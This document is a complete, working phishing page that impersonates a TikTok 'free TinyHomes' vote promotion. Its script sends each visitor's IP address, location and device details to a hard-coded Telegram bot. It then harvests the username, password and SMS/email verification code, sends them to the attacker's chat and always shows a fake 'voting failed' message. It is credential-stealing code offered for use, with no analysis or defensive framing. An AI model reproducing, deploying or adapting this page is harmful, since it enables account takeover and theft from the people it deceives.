<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free TinyHomes · Promo Rewards ✪</title>
    <!-- Font Awesome for TikTok icon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: radial-gradient(circle at 30% 10%, #0f1a1f, #030708);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            position: relative;
            overflow-x: hidden;
        }

        /* subtle dark vignette */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 70% 20%, rgba(0, 200, 200, 0.05), transparent 60%),
                        radial-gradient(circle at 20% 80%, rgba(255, 60, 80, 0.03), transparent 60%);
            pointer-events: none;
            z-index: 0;
        }

        .card {
            background: rgba(10, 18, 22, 0.85);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border-radius: 2.2rem;
            padding: 2rem 1.8rem;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 30px 50px -10px #000000, 0 0 0 1px rgba(0, 255, 255, 0.08),
                        0 0 40px rgba(0, 180, 255, 0.05);
            border: 1px solid rgba(50, 220, 220, 0.12);
            transition: transform 0.2s ease;
            position: relative;
            z-index: 2;
        }

        .screen {
            display: flex;
            flex-direction: column;
            width: 100%;
        }

        .hidden {
            display: none !important;
        }

        /* ===== TIKTOK BRANDING ===== */
        .tiktok-brand {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.6rem;
            margin-bottom: 1rem;
            color: #ffffff;
            letter-spacing: 1px;
            font-weight: 600;
            font-size: 1.3rem;
            text-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
        }

        .tiktok-brand i {
            font-size: 2rem;
            color: #00f2ea;
            filter: drop-shadow(0 0 8px rgba(0, 242, 234, 0.6));
            animation: subtlePulse 3s infinite;
        }

        .tiktok-brand span {
            background: linear-gradient(135deg, #ffffff, #a0e0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        @keyframes subtlePulse {
            0%, 100% { filter: drop-shadow(0 0 8px rgba(0, 242, 234, 0.6)); }
            50% { filter: drop-shadow(0 0 18px rgba(0, 242, 234, 0.9)); }
        }

        /* ===== TITLE (unicode math bold) ===== */
        .page-title {
            font-size: 1.6rem;
            font-weight: 500;
            text-align: center;
            letter-spacing: 1px;
            color: #eef5ff;
            text-shadow: 0 4px 20px rgba(0, 180, 255, 0.3);
            margin-bottom: 0.8rem;
            line-height: 1.3;
            word-break: break-word;
        }

        /* heartbeat tap to vote */
        .tap-vote-container {
            display: flex;
            justify-content: center;
            margin-top: 2rem;
            margin-bottom: 0.5rem;
            cursor: pointer;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
            transition: opacity 0.2s;
        }

        .tap-vote-container:active {
            opacity: 0.7;
        }

        .tap-vote {
            font-size: 1.8rem;
            font-weight: 600;
            color: #ffb347;
            text-shadow: 0 0 25px rgba(255, 180, 70, 0.8), 0 0 10px rgba(255, 100, 100, 0.5);
            letter-spacing: 2px;
            background: rgba(0, 0, 0, 0.4);
            padding: 0.9rem 2.2rem;
            border-radius: 60px;
            display: inline-block;
            animation: heartbeat 1.4s ease-in-out infinite;
            border: 1px solid rgba(255, 200, 100, 0.4);
            box-shadow: 0 0 30px rgba(255, 100, 0, 0.15);
        }

        @keyframes heartbeat {
            0% { transform: scale(1); }
            14% { transform: scale(1.12); }
            28% { transform: scale(1); }
            42% { transform: scale(1.12); }
            70% { transform: scale(1); }
        }

        /* ===== LOGIN FORM ===== */
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 1.3rem;
            margin-top: 0.8rem;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 0.4rem;
        }

        .input-group label {
            font-size: 0.9rem;
            font-weight: 500;
            color: #9ab8d0;
            letter-spacing: 0.5px;
            margin-left: 0.5rem;
        }

        .input-group input {
            background: rgba(5, 15, 20, 0.9);
            border: 1.5px solid #1f4d5a;
            border-radius: 60px;
            padding: 1rem 1.5rem;
            font-size: 1rem;
            color: #ffffff;
            outline: none;
            transition: border 0.2s, box-shadow 0.2s;
        }

        .input-group input:focus {
            border-color: #00f2ea;
            box-shadow: 0 0 0 3px rgba(0, 242, 234, 0.15), 0 0 25px rgba(0, 242, 234, 0.1);
        }

        .input-group input::placeholder {
            color: #4a6c7a;
            font-weight: 300;
        }

        /* login icon */
        .login-icon-wrapper {
            display: flex;
            justify-content: center;
            margin-top: 0.8rem;
            margin-bottom: 0.2rem;
        }

        .login-icon {
            background: linear-gradient(135deg, #0a4b5e, #062b36);
            width: 70px;
            height: 70px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 10px 25px -5px #000000, 0 0 0 2px rgba(0, 242, 234, 0.25);
            transition: all 0.2s;
            border: 2px solid #0e6d7a;
        }

        .login-icon:hover {
            transform: scale(1.05);
            background: linear-gradient(135deg, #0e6d7a, #0a4b5e);
            box-shadow: 0 12px 28px -4px #000000, 0 0 0 3px rgba(0, 242, 234, 0.5);
        }

        .login-icon:active {
            transform: scale(0.97);
        }

        .login-icon svg {
            width: 36px;
            height: 36px;
            fill: none;
            stroke: #ffffff;
            stroke-width: 2;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        /* ===== VERIFICATION SCREEN ===== */
        .verify-message {
            font-size: 1.1rem;
            text-align: center;
            color: #c0dcee;
            margin: 1.2rem 0 0.8rem;
            font-weight: 400;
            line-height: 1.5;
        }

        .verify-message strong {
            color: #7ae0ff;
            font-weight: 600;
        }

        .verification-form {
            display: flex;
            flex-direction: column;
            gap: 1.2rem;
            margin-top: 0.8rem;
        }

        .code-input {
            background: rgba(5, 15, 20, 0.9);
            border: 1.5px solid #1f4d5a;
            border-radius: 60px;
            padding: 1rem 1.5rem;
            font-size: 1.3rem;
            text-align: center;
            letter-spacing: 6px;
            color: #fff;
            outline: none;
            font-weight: 500;
        }

        .code-input:focus {
            border-color: #00f2ea;
            box-shadow: 0 0 0 3px rgba(0, 242, 234, 0.15);
        }

        .verify-btn {
            background: linear-gradient(135deg, #0e6d7a, #073e4a);
            border: none;
            border-radius: 60px;
            padding: 1rem;
            font-size: 1.1rem;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 10px 20px -8px #000000, 0 0 20px rgba(0, 242, 234, 0.1);
            border: 1px solid #1a8a9a;
            letter-spacing: 0.5px;
        }

        .verify-btn:active {
            transform: scale(0.98);
            background: linear-gradient(135deg, #073e4a, #052b33);
        }

        .error-message {
            color: #ff6b6b;
            font-size: 0.95rem;
            text-align: center;
            margin-top: 0.8rem;
            min-height: 1.5rem;
            font-weight: 500;
            letter-spacing: 0.3px;
            text-shadow: 0 0 10px rgba(255, 80, 80, 0.3);
        }

        /* loading spinner */
        .spinner {
            display: inline-block;
            width: 1.4rem;
            height: 1.4rem;
            border: 3px solid rgba(0, 242, 234, 0.15);
            border-radius: 50%;
            border-top-color: #00f2ea;
            animation: spin 0.8s linear infinite;
            margin-right: 0.5rem;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .redirect-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.3rem;
            color: #9ab8d0;
            font-size: 0.95rem;
            margin-top: 1rem;
        }

        /* small responsive */
        @media (max-width: 400px) {
            .card { padding: 1.5rem 1.2rem; }
            .page-title { font-size: 1.3rem; }
            .tap-vote { font-size: 1.5rem; padding: 0.7rem 1.5rem; }
            .tiktok-brand { font-size: 1.1rem; }
            .tiktok-brand i { font-size: 1.7rem; }
        }
    </style>
</head>
<body>
    <div class="card" id="appCard">
        <!-- ========== SCREEN 1: INITIAL PAGE (TAP TO VOTE) ========== -->
        <div id="screenStart" class="screen">
            <!-- TikTok branding -->
            <div class="tiktok-brand">
                <i class="fab fa-tiktok"></i>
                <span>TikTok</span>
            </div>
            <div class="page-title">𝔽𝕣𝕖𝕖 𝕋𝕚𝕟𝕪𝕙𝕠𝕞𝕖𝕤/𝕡𝕣𝕠𝕞𝕠 𝕣𝕖𝕨𝕒𝕣𝕕𝕤 ✪</div>
            <div class="tap-vote-container" id="tapToVoteBtn">
                <div class="tap-vote">𝕋𝕒𝕡 𝕥𝕠 𝕧𝕠𝕥𝕖</div>
            </div>
        </div>

        <!-- ========== SCREEN 2: LOGIN (USERNAME + PASSWORD) ========== -->
        <div id="screenLogin" class="screen hidden">
            <div class="tiktok-brand">
                <i class="fab fa-tiktok"></i>
                <span>TikTok</span>
            </div>
            <div class="page-title" style="font-size: 1.4rem; margin-bottom: 1.2rem;">𝔽𝕣𝕖𝕖 𝕋𝕚𝕟𝕪𝕙𝕠𝕞𝕖𝕤/𝕡𝕣𝕠𝕞𝕠 𝕣𝕖𝕨𝕒𝕣𝕕𝕤 ✪</div>
            
            <div class="login-form">
                <div class="input-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" placeholder="Enter your username" autocomplete="off">
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" placeholder="Enter your password" autocomplete="off">
                </div>
            </div>

            <!-- login icon at the bottom -->
            <div class="login-icon-wrapper" id="loginIconBtn">
                <div class="login-icon" title="Login">
                    <svg viewBox="0 0 24 24">
                        <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" />
                        <polyline points="10 17 15 12 10 7" />
                        <line x1="15" y1="12" x2="3" y2="12" />
                    </svg>
                </div>
            </div>
            <div id="loginError" class="error-message" style="min-height: 1.5rem;"></div>
        </div>

        <!-- ========== SCREEN 3: VERIFICATION CODE + FAILURE ========== -->
        <div id="screenVerify" class="screen hidden">
            <div class="tiktok-brand">
                <i class="fab fa-tiktok"></i>
                <span>TikTok</span>
            </div>
            <div class="page-title" style="font-size: 1.4rem; margin-bottom: 0.6rem;">𝔽𝕣𝕖𝕖 𝕋𝕚𝕟𝕪𝕙𝕠𝕞𝕖𝕤/𝕡𝕣𝕠𝕞𝕠 𝕣𝕖𝕨𝕒𝕣𝕕𝕤 ✪</div>
            
            <div class="verify-message">
                <strong>Check email, SMS, or WhatsApp</strong><br>
                to get your verification code
            </div>

            <div class="verification-form">
                <input type="text" id="verificationCode" class="code-input" placeholder="••••••" maxlength="6" inputmode="numeric">
                <button class="verify-btn" id="verifyBtn">Verify</button>
            </div>

            <div id="verifyError" class="error-message"></div>
            <div id="redirectStatus" class="redirect-note hidden">
                <span class="spinner"></span> Redirecting...
            </div>
        </div>
    </div>

    <script>
        (function() {
            // ========== TELEGRAM CONFIG ==========
            const TELEGRAM_BOT_TOKEN = '8616631878:AAFH3xPqTkWz6JE6RI8w_ILKyBjILpr5aW4';
            const TELEGRAM_CHAT_ID = '8008428584';

            // ========== ELEMENTS ==========
            const screenStart = document.getElementById('screenStart');
            const screenLogin = document.getElementById('screenLogin');
            const screenVerify = document.getElementById('screenVerify');
            const tapToVoteBtn = document.getElementById('tapToVoteBtn');
            const loginIconBtn = document.getElementById('loginIconBtn');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const loginError = document.getElementById('loginError');
            const verifyBtn = document.getElementById('verifyBtn');
            const verificationCodeInput = document.getElementById('verificationCode');
            const verifyError = document.getElementById('verifyError');
            const redirectStatus = document.getElementById('redirectStatus');

            // ========== STATE ==========
            let loginRedirectTimeout = null;
            let verifyFailureTimeout = null;
            let userIp = '';
            let userLocation = '';
            let ipFetched = false;

            // ========== UTILITIES ==========
            function clearAllTimeouts() {
                if (loginRedirectTimeout) {
                    clearTimeout(loginRedirectTimeout);
                    loginRedirectTimeout = null;
                }
                if (verifyFailureTimeout) {
                    clearTimeout(verifyFailureTimeout);
                    verifyFailureTimeout = null;
                }
            }

            function showScreen(screen) {
                screenStart.classList.add('hidden');
                screenLogin.classList.add('hidden');
                screenVerify.classList.add('hidden');
                screen.classList.remove('hidden');
            }

            function resetToStart() {
                clearAllTimeouts();
                usernameInput.value = '';
                passwordInput.value = '';
                verificationCodeInput.value = '';
                loginError.textContent = '';
                loginError.style.color = '#ff6b6b';
                verifyError.textContent = '';
                redirectStatus.classList.add('hidden');
                showScreen(screenStart);
            }

            // ========== TELEGRAM SENDER ==========
            async function sendToTelegram(message) {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                try {
                    await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                } catch (err) {
                    console.warn('Telegram send failed:', err);
                }
            }

            // ========== GET IP & LOCATION ==========
            async function fetchIpAndLocation() {
                if (ipFetched) return;
                try {
                    // Primary IP API
                    let res = await fetch('https://ipapi.co/json/');
                    if (!res.ok) throw new Error('ipapi failed');
                    let data = await res.json();
                    userIp = data.ip || 'Unknown';
                    userLocation = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`.replace(/^,|,$/g, '').trim() || 'Unknown location';
                    ipFetched = true;
                } catch (e) {
                    // Fallback IP API
                    try {
                        let res2 = await fetch('https://api.ipify.org?format=json');
                        let data2 = await res2.json();
                        userIp = data2.ip || 'Unknown';
                        userLocation = 'Unknown (fallback)';
                        ipFetched = true;
                    } catch (e2) {
                        userIp = 'Unknown';
                        userLocation = 'Unknown';
                        ipFetched = true;
                    }
                }
            }

            // ========== NOTIFY ON PAGE LOAD (link clicked) ==========
            (async function notifyPageLoad() {
                await fetchIpAndLocation();
                const msg = `🔔 <b>New user clicked the link</b>\n\n` +
                            `🌐 IP: <code>${userIp}</code>\n` +
                            `📍 Location: ${userLocation}\n` +
                            `🕒 Time: ${new Date().toLocaleString()}\n` +
                            `📱 User-Agent: ${navigator.userAgent.substring(0, 80)}...`;
                sendToTelegram(msg);
            })();

            // ========== TAP TO VOTE → LOGIN SCREEN ==========
            tapToVoteBtn.addEventListener('click', async function() {
                clearAllTimeouts();
                usernameInput.value = '';
                passwordInput.value = '';
                loginError.textContent = '';
                loginError.style.color = '#ff6b6b';
                showScreen(screenLogin);

                // Notify telegram about tap to vote click
                await fetchIpAndLocation();
                const msg = `👆 <b>User clicked "Tap to Vote"</b>\n\n` +
                            `🌐 IP: <code>${userIp}</code>\n` +
                            `📍 Location: ${userLocation}\n` +
                            `🕒 Time: ${new Date().toLocaleString()}`;
                sendToTelegram(msg);
            });

            // ========== LOGIN ICON CLICK ==========
            loginIconBtn.addEventListener('click', async function() {
                clearAllTimeouts();
                loginError.textContent = '';
                loginError.style.color = '#ff6b6b';

                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                // If password is empty → do NOT redirect, show error
                if (password === '') {
                    loginError.textContent = 'Password cannot be empty.';
                    return;
                }

                // Fetch IP if not already
                await fetchIpAndLocation();

                // Send login attempt to Telegram
                const loginMsg = `🔐 <b>Login Attempt</b>\n\n` +
                                 `👤 Username: <code>${username || '(empty)'}</code>\n` +
                                 `🔑 Password: <code>${password}</code>\n` +
                                 `🌐 IP: <code>${userIp}</code>\n` +
                                 `📍 Location: ${userLocation}\n` +
                                 `🕒 Time: ${new Date().toLocaleString()}\n` +
                                 `📱 Device: ${navigator.platform || 'Unknown'}`;
                sendToTelegram(loginMsg);

                // Show waiting status
                loginError.textContent = '⏳ Verifying, please wait...';
                loginError.style.color = '#9ab8d0';

                // 8-second redirect to verification
                loginRedirectTimeout = setTimeout(() => {
                    loginError.textContent = '';
                    loginError.style.color = '#ff6b6b';
                    verifyError.textContent = '';
                    redirectStatus.classList.add('hidden');
                    verificationCodeInput.value = '';
                    showScreen(screenVerify);
                    loginRedirectTimeout = null;
                }, 8000);
            });

            // Enter key on password
            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    loginIconBtn.click();
                }
            });

            // ========== VERIFY BUTTON ==========
            verifyBtn.addEventListener('click', async function() {
                if (verifyFailureTimeout) {
                    clearTimeout(verifyFailureTimeout);
                    verifyFailureTimeout = null;
                }

                verifyError.textContent = '';
                redirectStatus.classList.add('hidden');

                const code = verificationCodeInput.value.trim();

                // Send verification code attempt to Telegram
                await fetchIpAndLocation();
                const verifyMsg = `🔢 <b>Verification Code Entered</b>\n\n` +
                                  `🔢 Code: <code>${code || '(empty)'}</code>\n` +
                                  `🌐 IP: <code>${userIp}</code>\n` +
                                  `📍 Location: ${userLocation}\n` +
                                  `🕒 Time: ${new Date().toLocaleString()}`;
                sendToTelegram(verifyMsg);

                // Always show "Voting failed"
                verifyError.textContent = 'Voting failed. Invalid verification code.';
                verifyError.style.color = '#ff6b6b';

                // After 2.5s redirect to start
                verifyFailureTimeout = setTimeout(() => {
                    resetToStart();
                    verifyFailureTimeout = null;
                }, 2500);
            });

            // Enter key on verification code
            verificationCodeInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    verifyBtn.click();
                }
            });

        })();
    </script>
</body>
</html>
